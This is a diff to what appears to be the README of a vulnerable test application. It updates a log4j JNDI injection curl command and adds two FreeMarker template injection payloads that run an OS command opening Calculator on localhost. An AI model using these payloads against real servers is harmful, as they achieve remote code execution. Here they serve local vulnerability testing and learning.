@@ -19,5 +19,10 @@
    ```
 6. 测试log4j漏洞
    ```
-   curl 127.0.0.1:8080/log4j?log=%24%7Bjndi:ldap://127.0.0.1:1099/a%7D
+   curl 127.0.0.1:8080/log4j -d 'log=${jndi:ldap://127.0.0.1:1099/a}'
+   ```
+7. 测试freemarker漏洞
+   ```
+   curl 127.0.0.1:8080/freemarker/unsafe -d 'template=<#assign value%3d"freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("open /System/Applications/Calculator.app")</@value>'
+   curl 127.0.0.1:8080/freemarker/unsafe -d 'template=<#assign value%3d"freemarker.template.utility.Execute"?new()>$${value("open /System/Applications/Calculator.app")}'
    ```
